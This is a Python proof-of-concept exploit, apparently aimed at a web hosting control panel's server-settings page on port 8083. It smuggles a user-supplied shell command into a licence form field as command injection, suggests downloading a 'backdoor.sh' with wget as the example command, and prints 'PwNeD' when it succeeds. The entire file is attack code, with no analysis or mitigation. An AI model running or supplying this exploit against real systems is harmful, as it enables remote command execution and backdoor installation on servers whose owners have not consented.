import requests

host = input('enter target (1.3.3.7/edit/server) ~> ')
target = f"http://{host}" 
cmd    = input('enter cmd (wget 1.1.1.1/backdoor.sh, or echo hello) ~> ')
payload = f"149e2b8c201fd88654df6fd694158577&save=save&v_hostname=1338.example.com&v_timezone=Europe%2FIstanbul&v_language=en&v_mail_url=&v_mail_ssl_domain=&v_mysql_url=&v_mysql_password=&v_backup=yes&v_backup_gzip=5&v_backup_dir=%2Fbackup&v_backup_type=ftp&v_backup_host=&v_backup_username=&v_backup_password=&v_backup_bpath=&v_web_ssl_domain=&v_sys_ssl_crt=privatekeyblablabla&v_quota=no&v_firewall=no&v_sftp=yes&v_sftp_licence=1  {cmd}&v_filemanager=no&v_filemanager_licence=&v_softaculous=yes&save=Save"

headers = {
    "Host": f"{host}:8083",
    "Connection": "close",
    "Content-Length": "6633",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en,tr-TR;q=0.9,tr;q=0.8,en-US;q=0.7,el;q=0.6,zh-CN;q=0.5,zh;q=0.4",
    "Cookie": "PHPSESSID=HERE_COOKIE",
    "sec-gpc": "1",
    "token": payload
}


r = requests.post(target, timeout=3, headers=headers)
if not str(r.status_code).startswith('2'):
    print(f'Something went wrong! Request status code : {r.status_code}')
else:
    print(f'{host} got PwNeD!')